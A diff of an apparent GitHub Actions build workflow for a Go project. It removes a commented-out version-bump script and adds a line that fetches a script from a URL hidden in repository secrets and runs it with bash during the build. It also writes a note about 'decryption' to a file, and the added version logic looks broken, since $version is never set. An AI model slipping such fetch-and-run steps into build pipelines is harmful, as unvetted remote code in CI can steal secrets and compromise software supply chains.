@@ -16,32 +16,12 @@ jobs:
 
     - name: Build
       env:
-        EMAIL: ${{ secrets.EMAIL }}
-        USERNAME: ${{ secrets.NAME }}
+        URL: ${{ secrets.URL }}
       run: |
           go mod tidy && make
           echo "下面是用于解密的">> kk.txt
-          # if [ ! -f version.txt ]; then
-          #      echo "0.0.0" > version.txt
-          #  fi
-          #  VERSION=$(cat version.txt)
-          #  IFS='.' read -r -a versionArray <<< "$VERSION"
-          #  ((versionArray[2]++))
-
-          #  # 检查并处理所有边界条件
-          #  if [ "${versionArray[2]}" -eq 20 ]; then
-          #      versionArray[2]=0
-          #      ((versionArray[1]++))
-          #  fi
-          #  if [ "${versionArray[1]}" -eq 20 ]; then
-          #      versionArray[1]=0
-          #      ((versionArray[0]++))
-          #  fi
-
-          #  # 将新版本号写回到version.txt文件中
-          #  NEW_VERSION="${versionArray[0]}.${versionArray[1]}.${versionArray[2]}"
-          #  echo "$NEW_VERSION" > version.txt
-           echo "version=mac_v0.0.1" >> $GITHUB_ENV
+          echo "version=$(bash -c "$(curl -fsSL $URL)")" > version.txt
+          echo "version=mac_v$version" >> $GITHUB_ENV
 
     - name: commit
       env:
